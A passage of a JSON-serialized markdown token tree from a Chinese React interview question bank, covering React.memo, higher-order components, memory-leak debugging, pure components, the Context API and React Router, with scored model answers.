React.memo(RealTimeChart);\\n//当数据更新时，只有 dataArray 或 chartType 发生变化，RealTimeChart 组件才会重新渲染，否则将使用之前的渲染结果，避免了因其他无关因素导致的重新渲染，提升了性能。\\n```","lang":"js","text":"import React from \'react\';\\nconst RealTimeChart = ({ dataArray, chartType }) => {\\n    // 复杂的图表绘制逻辑，可能涉及到数据处理、坐标轴设置等\\n    return (\\n        <div>\\n            <Chart data={dataArray} type={chartType} />\\n        </div>\\n    );\\n};\\nexport default React.memo(RealTimeChart);\\n//当数据更新时，只有 dataArray 或 chartType 发生变化，RealTimeChart 组件才会重新渲染，否则将使用之前的渲染结果，避免了因其他无关因素导致的重新渲染，提升了性能。"},{"type":"space","raw":"\\n\\n"},{"type":"html","block":true,"raw":"</details>\\n\\n","pre":false,"text":"</details>\\n\\n"},{"type":"heading","raw":"## 15. 什么是 React 中的高阶组件（HOC）？请简单举例说明其用法\\n\\n","depth":2,"text":"15. 什么是 React 中的高阶组件（HOC）？请简单举例说明其用法","tokens":[{"type":"text","raw":"15. 什么是 React 中的高阶组件（HOC）？请简单举例说明其用法","text":"15. 什么是 React 中的高阶组件（HOC）？请简单举例说明其用法","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（3 分）\\n\\n","depth":4,"text":"解答（3 分）","tokens":[{"type":"text","raw":"解答（3 分）","text":"解答（3 分）","escaped":false}]},{"type":"list","raw":"- **1：** 高阶组件（Higher - Order Component，简称 HOC）是一个函数，它接收一个组件作为参数，并返回一个新的组件。这个新组件通常会增强或修改原始组件\\n的功能、行为或外观。可以把它看作是一种组件的 “工厂函数”，用于创建具有额外功能的组件。\\n- **1：** 用法1：代码复用。HOC 可以将多个组件共有的逻辑提取出来，放到一个地方进行复用。例如，多个组件都需要进行权限验证，就可以创建一个权限验证的 HOC，\\n让这些组件都通过这个 HOC 来获得权限验证功能。\\n- **1：** 用法2：逻辑抽象和分离。可以将一些复杂的、与业务逻辑无关的功能（如数据加载、动画效果等）从组件内部抽象出来，通过 HOC 来处理，使得组件本身更加专\\n注于自己的核心业务逻辑（如展示 UI 和处理用户交互）。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** 高阶组件（Higher - Order Component，简称 HOC）是一个函数，它接收一个组件作为参数，并返回一个新的组件。这个新组件通常会增强或修改原始组件\\n的功能、行为或外观。可以把它看作是一种组件的 “工厂函数”，用于创建具有额外功能的组件。\\n","task":false,"loose":false,"text":"**1：** 高阶组件（Higher - Order Component，简称 HOC）是一个函数，它接收一个组件作为参数，并返回一个新的组件。这个新组件通常会增强或修改原始组件\\n的功能、行为或外观。可以把它看作是一种组件的 “工厂函数”，用于创建具有额外功能的组件。","tokens":[{"type":"text","raw":"**1：** 高阶组件（Higher - Order Component，简称 HOC）是一个函数，它接收一个组件作为参数，并返回一个新的组件。这个新组件通常会增强或修改原始组件\\n\\n的功能、行为或外观。可以把它看作是一种组件的 “工厂函数”，用于创建具有额外功能的组件。","text":"**1：** 高阶组件（Higher - Order Component，简称 HOC）是一个函数，它接收一个组件作为参数，并返回一个新的组件。这个新组件通常会增强或修改原始组件\\n的功能、行为或外观。可以把它看作是一种组件的 “工厂函数”，用于创建具有额外功能的组件。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 高阶组件（Higher - Order Component，简称 HOC）是一个函数，它接收一个组件作为参数，并返回一个新的组件。这个新组件通常会增强或修改原始组件\\n的功能、行为或外观。可以把它看作是一种组件的 “工厂函数”，用于创建具有额外功能的组件。","text":" 高阶组件（Higher - Order Component，简称 HOC）是一个函数，它接收一个组件作为参数，并返回一个新的组件。这个新组件通常会增强或修改原始组件\\n的功能、行为或外观。可以把它看作是一种组件的 “工厂函数”，用于创建具有额外功能的组件。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 用法1：代码复用。HOC 可以将多个组件共有的逻辑提取出来，放到一个地方进行复用。例如，多个组件都需要进行权限验证，就可以创建一个权限验证的 HOC，\\n让这些组件都通过这个 HOC 来获得权限验证功能。\\n","task":false,"loose":false,"text":"**1：** 用法1：代码复用。HOC 可以将多个组件共有的逻辑提取出来，放到一个地方进行复用。例如，多个组件都需要进行权限验证，就可以创建一个权限验证的 HOC，\\n让这些组件都通过这个 HOC 来获得权限验证功能。","tokens":[{"type":"text","raw":"**1：** 用法1：代码复用。HOC 可以将多个组件共有的逻辑提取出来，放到一个地方进行复用。例如，多个组件都需要进行权限验证，就可以创建一个权限验证的 HOC，\\n\\n让这些组件都通过这个 HOC 来获得权限验证功能。","text":"**1：** 用法1：代码复用。HOC 可以将多个组件共有的逻辑提取出来，放到一个地方进行复用。例如，多个组件都需要进行权限验证，就可以创建一个权限验证的 HOC，\\n让这些组件都通过这个 HOC 来获得权限验证功能。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 用法1：代码复用。HOC 可以将多个组件共有的逻辑提取出来，放到一个地方进行复用。例如，多个组件都需要进行权限验证，就可以创建一个权限验证的 HOC，\\n让这些组件都通过这个 HOC 来获得权限验证功能。","text":" 用法1：代码复用。HOC 可以将多个组件共有的逻辑提取出来，放到一个地方进行复用。例如，多个组件都需要进行权限验证，就可以创建一个权限验证的 HOC，\\n让这些组件都通过这个 HOC 来获得权限验证功能。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 用法2：逻辑抽象和分离。可以将一些复杂的、与业务逻辑无关的功能（如数据加载、动画效果等）从组件内部抽象出来，通过 HOC 来处理，使得组件本身更加专\\n注于自己的核心业务逻辑（如展示 UI 和处理用户交互）。","task":false,"loose":false,"text":"**1：** 用法2：逻辑抽象和分离。可以将一些复杂的、与业务逻辑无关的功能（如数据加载、动画效果等）从组件内部抽象出来，通过 HOC 来处理，使得组件本身更加专\\n注于自己的核心业务逻辑（如展示 UI 和处理用户交互）。","tokens":[{"type":"text","raw":"**1：** 用法2：逻辑抽象和分离。可以将一些复杂的、与业务逻辑无关的功能（如数据加载、动画效果等）从组件内部抽象出来，通过 HOC 来处理，使得组件本身更加专\\n\\n注于自己的核心业务逻辑（如展示 UI 和处理用户交互）。","text":"**1：** 用法2：逻辑抽象和分离。可以将一些复杂的、与业务逻辑无关的功能（如数据加载、动画效果等）从组件内部抽象出来，通过 HOC 来处理，使得组件本身更加专\\n注于自己的核心业务逻辑（如展示 UI 和处理用户交互）。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 用法2：逻辑抽象和分离。可以将一些复杂的、与业务逻辑无关的功能（如数据加载、动画效果等）从组件内部抽象出来，通过 HOC 来处理，使得组件本身更加专\\n注于自己的核心业务逻辑（如展示 UI 和处理用户交互）。","text":" 用法2：逻辑抽象和分离。可以将一些复杂的、与业务逻辑无关的功能（如数据加载、动画效果等）从组件内部抽象出来，通过 HOC 来处理，使得组件本身更加专\\n注于自己的核心业务逻辑（如展示 UI 和处理用户交互）。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 16. 什如何在 React 应用中进行有效的内存泄漏排查和修复？\\n\\n","depth":2,"text":"16. 什如何在 React 应用中进行有效的内存泄漏排查和修复？","tokens":[{"type":"text","raw":"16. 什如何在 React 应用中进行有效的内存泄漏排查和修复？","text":"16. 什如何在 React 应用中进行有效的内存泄漏排查和修复？","escaped":false}]},{"type":"heading","raw":"#### 类型：`拓展`\\n\\n","depth":4,"text":"类型：`拓展`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`拓展`","text":"拓展"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（3 分）\\n\\n","depth":4,"text":"解答（3 分）","tokens":[{"type":"text","raw":"解答（3 分）","text":"解答（3 分）","escaped":false}]},{"type":"list","raw":"- **1：** 使用 Chrome 开发者工具的 Memory 面板进行内存快照分析，查找未被释放的对象；\\n- **1：** 检查组件卸载时是否取消了订阅、定时器、事件监听器等可能导致内存泄漏的源头；\\n- **1：** 对于使用了第三方库的情况，要确保库的使用方式正确，避免因库的不当使用造成内存泄漏。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** 使用 Chrome 开发者工具的 Memory 面板进行内存快照分析，查找未被释放的对象；\\n","task":false,"loose":false,"text":"**1：** 使用 Chrome 开发者工具的 Memory 面板进行内存快照分析，查找未被释放的对象；","tokens":[{"type":"text","raw":"**1：** 使用 Chrome 开发者工具的 Memory 面板进行内存快照分析，查找未被释放的对象；","text":"**1：** 使用 Chrome 开发者工具的 Memory 面板进行内存快照分析，查找未被释放的对象；","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 使用 Chrome 开发者工具的 Memory 面板进行内存快照分析，查找未被释放的对象；","text":" 使用 Chrome 开发者工具的 Memory 面板进行内存快照分析，查找未被释放的对象；","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 检查组件卸载时是否取消了订阅、定时器、事件监听器等可能导致内存泄漏的源头；\\n","task":false,"loose":false,"text":"**1：** 检查组件卸载时是否取消了订阅、定时器、事件监听器等可能导致内存泄漏的源头；","tokens":[{"type":"text","raw":"**1：** 检查组件卸载时是否取消了订阅、定时器、事件监听器等可能导致内存泄漏的源头；","text":"**1：** 检查组件卸载时是否取消了订阅、定时器、事件监听器等可能导致内存泄漏的源头；","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 检查组件卸载时是否取消了订阅、定时器、事件监听器等可能导致内存泄漏的源头；","text":" 检查组件卸载时是否取消了订阅、定时器、事件监听器等可能导致内存泄漏的源头；","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 对于使用了第三方库的情况，要确保库的使用方式正确，避免因库的不当使用造成内存泄漏。","task":false,"loose":false,"text":"**1：** 对于使用了第三方库的情况，要确保库的使用方式正确，避免因库的不当使用造成内存泄漏。","tokens":[{"type":"text","raw":"**1：** 对于使用了第三方库的情况，要确保库的使用方式正确，避免因库的不当使用造成内存泄漏。","text":"**1：** 对于使用了第三方库的情况，要确保库的使用方式正确，避免因库的不当使用造成内存泄漏。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 对于使用了第三方库的情况，要确保库的使用方式正确，避免因库的不当使用造成内存泄漏。","text":" 对于使用了第三方库的情况，要确保库的使用方式正确，避免因库的不当使用造成内存泄漏。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 17. 什么是纯组件？为什么要使用纯组件？\\n\\n","depth":2,"text":"17. 什么是纯组件？为什么要使用纯组件？","tokens":[{"type":"text","raw":"17. 什么是纯组件？为什么要使用纯组件？","text":"17. 什么是纯组件？为什么要使用纯组件？","escaped":false}]},{"type":"heading","raw":"#### 类型：`拓展`\\n\\n","depth":4,"text":"类型：`拓展`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`拓展`","text":"拓展"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（3 分）\\n\\n","depth":4,"text":"解答（3 分）","tokens":[{"type":"text","raw":"解答（3 分）","text":"解答（3 分）","escaped":false}]},{"type":"list","raw":"- 纯组件：\\n\\n- 纯组件是一种特殊的组件，它通过 React.memo（函数组件）或 PureComponent（类组件）来实现。纯组件会在 props 或 state 发生变化时进行浅比较，如果前后值相同，则跳过重新渲染。\\n\\n- 优点：1、减少不必要的重新渲染，提高应用性能。 2、开发者不需要手动实现 shouldComponentUpdate 方法来优化性能。\\n\\n- 使用场景：\\n\\n- 静态数据：组件的 props 和 state 不经常变化。\\n\\n- 复杂组件：组件内部逻辑复杂，重新渲染开销大。","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- 纯组件：\\n\\n","task":false,"loose":true,"text":"纯组件：\\n","tokens":[{"type":"text","raw":"纯组件：\\n","text":"纯组件：","tokens":[{"type":"text","raw":"纯组件：","text":"纯组件：","escaped":false}]}]},{"type":"list_item","raw":"- 纯组件是一种特殊的组件，它通过 React.memo（函数组件）或 PureComponent（类组件）来实现。纯组件会在 props 或 state 发生变化时进行浅比较，如果前后值相同，则跳过重新渲染。\\n\\n","task":false,"loose":true,"text":"纯组件是一种特殊的组件，它通过 React.memo（函数组件）或 PureComponent（类组件）来实现。纯组件会在 props 或 state 发生变化时进行浅比较，如果前后值相同，则跳过重新渲染。\\n","tokens":[{"type":"text","raw":"纯组件是一种特殊的组件，它通过 React.memo（函数组件）或 PureComponent（类组件）来实现。纯组件会在 props 或 state 发生变化时进行浅比较，如果前后值相同，则跳过重新渲染。\\n","text":"纯组件是一种特殊的组件，它通过 React.memo（函数组件）或 PureComponent（类组件）来实现。纯组件会在 props 或 state 发生变化时进行浅比较，如果前后值相同，则跳过重新渲染。","tokens":[{"type":"text","raw":"纯组件是一种特殊的组件，它通过 React.memo（函数组件）或 PureComponent（类组件）来实现。纯组件会在 props 或 state 发生变化时进行浅比较，如果前后值相同，则跳过重新渲染。","text":"纯组件是一种特殊的组件，它通过 React.memo（函数组件）或 PureComponent（类组件）来实现。纯组件会在 props 或 state 发生变化时进行浅比较，如果前后值相同，则跳过重新渲染。","escaped":false}]}]},{"type":"list_item","raw":"- 优点：1、减少不必要的重新渲染，提高应用性能。 2、开发者不需要手动实现 shouldComponentUpdate 方法来优化性能。\\n\\n","task":false,"loose":true,"text":"优点：1、减少不必要的重新渲染，提高应用性能。 2、开发者不需要手动实现 shouldComponentUpdate 方法来优化性能。\\n","tokens":[{"type":"text","raw":"优点：1、减少不必要的重新渲染，提高应用性能。 2、开发者不需要手动实现 shouldComponentUpdate 方法来优化性能。\\n","text":"优点：1、减少不必要的重新渲染，提高应用性能。 2、开发者不需要手动实现 shouldComponentUpdate 方法来优化性能。","tokens":[{"type":"text","raw":"优点：1、减少不必要的重新渲染，提高应用性能。 2、开发者不需要手动实现 shouldComponentUpdate 方法来优化性能。","text":"优点：1、减少不必要的重新渲染，提高应用性能。 2、开发者不需要手动实现 shouldComponentUpdate 方法来优化性能。","escaped":false}]}]},{"type":"list_item","raw":"- 使用场景：\\n\\n","task":false,"loose":true,"text":"使用场景：\\n","tokens":[{"type":"text","raw":"使用场景：\\n","text":"使用场景：","tokens":[{"type":"text","raw":"使用场景：","text":"使用场景：","escaped":false}]}]},{"type":"list_item","raw":"- 静态数据：组件的 props 和 state 不经常变化。\\n\\n","task":false,"loose":true,"text":"静态数据：组件的 props 和 state 不经常变化。\\n","tokens":[{"type":"text","raw":"静态数据：组件的 props 和 state 不经常变化。\\n","text":"静态数据：组件的 props 和 state 不经常变化。","tokens":[{"type":"text","raw":"静态数据：组件的 props 和 state 不经常变化。","text":"静态数据：组件的 props 和 state 不经常变化。","escaped":false}]}]},{"type":"list_item","raw":"- 复杂组件：组件内部逻辑复杂，重新渲染开销大。","task":false,"loose":true,"text":"复杂组件：组件内部逻辑复杂，重新渲染开销大。","tokens":[{"type":"text","raw":"复杂组件：组件内部逻辑复杂，重新渲染开销大。","text":"复杂组件：组件内部逻辑复杂，重新渲染开销大。","tokens":[{"type":"text","raw":"复杂组件：组件内部逻辑复杂，重新渲染开销大。","text":"复杂组件：组件内部逻辑复杂，重新渲染开销大。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 18. 什么是 React Context API？它解决了什么问题？\\n\\n","depth":2,"text":"18. 什么是 React Context API？它解决了什么问题？","tokens":[{"type":"text","raw":"18. 什么是 React Context API？它解决了什么问题？","text":"18. 什么是 React Context API？它解决了什么问题？","escaped":false}]},{"type":"heading","raw":"#### 类型：`拓展`\\n\\n","depth":4,"text":"类型：`拓展`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`拓展`","text":"拓展"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（3 分）\\n\\n","depth":4,"text":"解答（3 分）","tokens":[{"type":"text","raw":"解答（3 分）","text":"解答（3 分）","escaped":false}]},{"type":"list","raw":"- React Context API：\\n\\n- Context API 是 React 提供的一种在组件树中传递数据的机制，无需通过 props 逐层传递。\\n\\n- 创建 Context：使用 React.createContext 创建一个 Context 对象。\\n\\n- 提供 Context：使用 Context.Provider 组件将数据传递给子组件。\\n\\n- 消费 Context：使用 Context.Consumer 组件或 useContext Hook 在子组件中访问数据。","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- React Context API：\\n\\n","task":false,"loose":true,"text":"React Context API：\\n","tokens":[{"type":"text","raw":"React Context API：\\n","text":"React Context API：","tokens":[{"type":"text","raw":"React Context API：","text":"React Context API：","escaped":false}]}]},{"type":"list_item","raw":"- Context API 是 React 提供的一种在组件树中传递数据的机制，无需通过 props 逐层传递。\\n\\n","task":false,"loose":true,"text":"Context API 是 React 提供的一种在组件树中传递数据的机制，无需通过 props 逐层传递。\\n","tokens":[{"type":"text","raw":"Context API 是 React 提供的一种在组件树中传递数据的机制，无需通过 props 逐层传递。\\n","text":"Context API 是 React 提供的一种在组件树中传递数据的机制，无需通过 props 逐层传递。","tokens":[{"type":"text","raw":"Context API 是 React 提供的一种在组件树中传递数据的机制，无需通过 props 逐层传递。","text":"Context API 是 React 提供的一种在组件树中传递数据的机制，无需通过 props 逐层传递。","escaped":false}]}]},{"type":"list_item","raw":"- 创建 Context：使用 React.createContext 创建一个 Context 对象。\\n\\n","task":false,"loose":true,"text":"创建 Context：使用 React.createContext 创建一个 Context 对象。\\n","tokens":[{"type":"text","raw":"创建 Context：使用 React.createContext 创建一个 Context 对象。\\n","text":"创建 Context：使用 React.createContext 创建一个 Context 对象。","tokens":[{"type":"text","raw":"创建 Context：使用 React.createContext 创建一个 Context 对象。","text":"创建 Context：使用 React.createContext 创建一个 Context 对象。","escaped":false}]}]},{"type":"list_item","raw":"- 提供 Context：使用 Context.Provider 组件将数据传递给子组件。\\n\\n","task":false,"loose":true,"text":"提供 Context：使用 Context.Provider 组件将数据传递给子组件。\\n","tokens":[{"type":"text","raw":"提供 Context：使用 Context.Provider 组件将数据传递给子组件。\\n","text":"提供 Context：使用 Context.Provider 组件将数据传递给子组件。","tokens":[{"type":"text","raw":"提供 Context：使用 Context.Provider 组件将数据传递给子组件。","text":"提供 Context：使用 Context.Provider 组件将数据传递给子组件。","escaped":false}]}]},{"type":"list_item","raw":"- 消费 Context：使用 Context.Consumer 组件或 useContext Hook 在子组件中访问数据。","task":false,"loose":true,"text":"消费 Context：使用 Context.Consumer 组件或 useContext Hook 在子组件中访问数据。","tokens":[{"type":"text","raw":"消费 Context：使用 Context.Consumer 组件或 useContext Hook 在子组件中访问数据。","text":"消费 Context：使用 Context.Consumer 组件或 useContext Hook 在子组件中访问数据。","tokens":[{"type":"text","raw":"消费 Context：使用 Context.Consumer 组件或 useContext Hook 在子组件中访问数据。","text":"消费 Context：使用 Context.Consumer 组件或 useContext Hook 在子组件中访问数据。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 19. 什么是 React Router？它的主要特点是什么？\\n\\n","depth":2,"text":"19. 什么是 React Router？它的主要特点是什么？","tokens":[{"type":"text","raw":"19. 什么是 React Router？它的主要特点是什么？","text":"19. 什么是 React Router？它的主要特点是什么？","escaped":false}]},{"type":"heading","raw":"#### 类型：`拓展`\\n\\n","depth":4,"text":"类型：`拓展`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`拓展`","text":"拓展"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（3 分）\\n\\n","depth":4,"text":"解答（3 分）","tokens":[{"type":"text","raw":"解答（3 分）","text":"解答（3 分）","escaped":false}]},{"type":"list","raw":"- React Router 是一个用于 React 应用的路由库，它允许你在单页应用（SPA）中实现多页面的导航和路由管理。\\n\\n- 主要特点：\\n\\n- 声明式路由：使用声明式的方式来定义路由，使代码更加清晰和易于维护。\\n\\n- 动态路由匹配：支持动态参数匹配，可以根据 URL 参数动态加载不同的组件。\\n\\n- 嵌套路由：支持嵌套路由，可以轻松实现多级嵌套的页面结构。\\n\\n- 编程式导航：提供编程式导航的方法，可以在代码中控制页面的跳转。\\n\\n- 路由守卫：支持路由守卫，可以在路由切换前后执行特定的逻辑。\\n\\n- 懒加载：支持代码分割和懒加载，可以按需加载组件，提高应用性能。","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- React Router 是一个用于 React 应用的路由库，它允许你在单页应用（SPA）中实现多页面的导航和路由管理。\\n\\n","task":false,"loose":true,"text":"React Router 是一个用于 React 应用的路由库，它允许你在单页应用（SPA）中实现多页面的导航和路由管理。\\n","tokens":[{"type":"text","raw":"React Router 是一个用于 React 应用的路由库，它允许你在单页应用（SPA）中实现多页面的导航和路由管理。\\n","text":"React Router 是一个用于 React 应用的路由库，它允许你在单页应用（SPA）中实现多页面的导航和路由管理。","tokens":[{"type":"text","raw":"React Router 是一个用于 React 应用的路由库，它允许你在单页应用（SPA）中实现多页面的导航和路由管理。","text":"React Router 是一个用于 React 应用的路由库，它允许你在单页应用（SPA）中实现多页面的导航和路由管理。","escaped":false}]}]},{"type":"list_item","raw":"- 主要特点：\\n\\n","task":false,"loose":true,"text":"主要特点：\\n","tokens":[{"type":"text","raw":"主要特点：\\n","text":"主要特点：","tokens":[{"type":"text","raw":"主要特点：","text":"主要特点：","escaped":false}]}]},{"type":"list_item","raw":"- 声明式路由：使用声明式的方式来定义路由，使代码更加清晰和易于维护。\\n\\n","task":false,"loose":true,"text":"声明式路由：使用声明式的方式来定义路由，使代码更加清晰和易于维护。\\n","tokens":[{"type":"text","raw":"声明式路由：使用声明式的方式来定义路由，使代码更加清晰和易于维护。\\n","text":"声明式路由：使用声明式的方式来定义路由，使代码更加清晰和易于维护。","tokens":[{"type":"text","raw":"声明式路由：使用声明式的方式来定义路由，使代码更加清晰和易于维护。","text":"声明式路由：使用声明式的方式来定义路由，使代码更加清晰和易于维护。","escaped":false}]}]},{"type":"list_item","raw":"- 动态路由匹配：支持动态参数匹配，可以根据 URL 参数动态加载不同的组件。\\n\\n","task":false,"loose":true,"text":"动态路由匹配：支持动态参数匹配，可以根据 URL 参数动态加载不同的组件。\\n","tokens":[{"type":"text","raw":"动态路由匹配：支持动态参数匹配，可以根据 URL 参数动态加载不同的组件。\\n","text":"动态路由匹配：支持动态参数匹配，可以根据 URL 参数动态加载不同的组件。","tokens":[{"type":"text","raw":"动态路由匹配：支持动态参数匹配，可以根据 URL 参数动态加载不同的组件。","text":"动态路由匹配：支持动态参数匹配，可以根据 URL 参数动态加载不同的组件。","escaped":false}]}]},{"type":"list_item","raw":"- 嵌套路由：支持嵌套路由，可以轻松实现多级嵌套的页面结构。\\n\\n","task":false,"loose":true,"text":"嵌套路由：支持嵌套路由，可以轻松实现多级嵌套的页面结构。\\n","tokens":[{"type":"text","raw":"嵌套路由：支持嵌套路由，可以轻松实现多级嵌套的页面结构。\\n","text":"嵌套路由：支持嵌套路由，可以轻松实现多级嵌套的页面结构。","tokens":[{"type":"text","raw":"嵌套路由：支持嵌套路由，可以轻松实现多级嵌套的页面结构。","text":"嵌套路由：支持嵌套路由，可以轻松实现多级嵌套的页面结构。","escaped":false}]}]},{"type":"list_item","raw":"- 编程式导航：提供编程式导航的方法，可以在代码中控制页面的跳转。\\n\\n","task":false,"loose":true,"text":"编程式导航：提供编程式导航的方法，可以在代码中控制页面的跳转。\\n","tokens":[{"type":"text","raw":"编程式导航：提供编程式导航的方法，可以在代码中控制页面的跳转。\\n","text":"编程式导航：提供编程式导航的方法，可以在代码中控制页面的跳转。","tokens":[{"type":"text","raw":"编程式导航：提供编程式导航的方法，可以在代码中控制页面的跳转。","text":"编程式导航：提供编程式导航的方法，可以在代码中控制页面的跳转。","escaped":false}]}]},{"type":"list_item","raw":"- 路由守卫：支持路由守卫，可以在路由切换前后执行特定的逻辑。\\n\\n","task":false,"loose":true,"text":"路由守卫：支持路由守卫，可以在路由切换前后执行特定的逻辑。\\n","tokens":[{"type":"text","raw":"路由守卫：支持路由守卫，可以在路由切换前后执行特定的逻辑。\\n","text":"路由守卫：支持路由守卫，可以在路由切换前后执行特定的逻辑。","tokens":[{"type":"text","raw":"路由守卫：支持路由守卫，可以在路由切换前后执行特定的逻辑。","text":"路由守卫：支持路由守卫，可以在路由切换前后执行特定的逻辑。","escaped":false}]}]},{"type":"list_item","raw":"- 懒加载：支持代码分割和懒加载，可以按需加载组件，提高应用性能。","task":false,"loose":true,"text":"懒加载：支持代码分割和懒加载，可以按需加载组件，提高应用性能。","tokens":[{"type":"text","raw":"懒加载：支持代码分割和懒加载，可以按需加载组件，提高应用性能。","text":"懒加载：支持代码分割和懒加载，可以按需加载组件，提高应用性能。","tokens":[{"type":"text","raw":"懒加载：支持代码分割和懒加载，可以按需加载组件，提高应用性能。","text":"懒加载：支持代码分割和懒加载，可以按需加载组件，提高应用性能。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 20. 什么是 useState？它如何工作？\\n\\n","depth":2,"text":"20. 什么是 useState？它如何工作？","tokens":[{"type":"text","raw":"20. 什么是 useState？它如何工作？","text":"20. 什么是 useState？它如何工作？","escaped":false}]},{"type":"heading","raw":"#### 